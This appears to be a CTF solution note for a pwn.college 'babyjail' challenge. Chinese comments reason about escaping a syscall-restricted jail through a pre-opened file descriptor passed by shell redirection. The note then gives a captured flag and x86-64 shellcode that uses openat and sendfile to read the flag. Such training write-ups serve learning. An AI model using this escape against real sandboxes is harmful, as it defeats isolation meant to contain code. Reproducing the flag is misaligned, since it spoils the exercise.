# 只有openat, read, write, sendfile可以用
# 通过使用环境变量中存在的路径, 获得某个外部路径, 是这样吗?
# 或是通过不被调整的PID/NETWORK/IPC
# 总的来说, 这题一定是考察这个知识点, namespace没有隔离干净
# $ ll /proc/$$/ns 查看进程所属namespace
# 参考资料 https://zhuanlan.zhihu.com/p/47571649
# https://www.gnu.org/software/bash/manual/html_node/Redirections.html
# 似乎这题是使用重定向流来解决, 在运行程序的时候使用 ./babyjsil8 [n]</
# 这会创建一个编号为n的文件fd, 在程序内部可以访问
# 可能我写的有些小问题, 检查一下
# 执行 cat /tmp/test.md | ./babyjail 10</
pwn_college{wesLvZCGyPBSx05IHgHPHC6mFy5.dRDNxwiMxkzW}


.global _start
_start:
.intel_syntax noprefix
        xor rax, rax
        mov ax, 257
        xor rdi, rdi
        mov rdi, 10
        lea rsi, [rip+flag]
        xor rdx, rdx
        xor r10, r10
        syscall
        mov rsi, rax
        mov ax, 40
        xor rdi, rdi
        inc rdi
        mov r10, 100
        syscall
flag:
        .string "flag"

end
